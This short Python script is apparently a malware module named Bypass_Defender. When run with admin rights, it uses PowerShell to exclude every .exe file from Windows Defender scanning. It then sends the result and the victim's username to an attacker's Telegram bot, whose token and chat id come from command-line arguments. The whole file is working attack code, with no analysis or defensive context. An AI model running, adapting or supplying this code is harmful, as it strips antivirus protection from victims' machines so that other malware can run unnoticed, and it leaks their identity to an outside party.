import os, ctypes, requests , getpass, sys
class Bypass_Defender():
	def __init__(self):

		self.token = sys.argv[1]
		self.chat_id = sys.argv[2]

		if ctypes.windll.shell32.IsUserAnAdmin() == 1:
			os.system("powershell.exe -c \"Add-MpPreference -ExclusionExtension '.exe';\"")
			self.SendMessage("✔ Defender Bypassed.")
		else:
			self.SendMessage("✖️ Need Admin Permissions.")

	def SendMessage(self,message):
		requests.get("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + message + "\n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)
Bypass_Defender()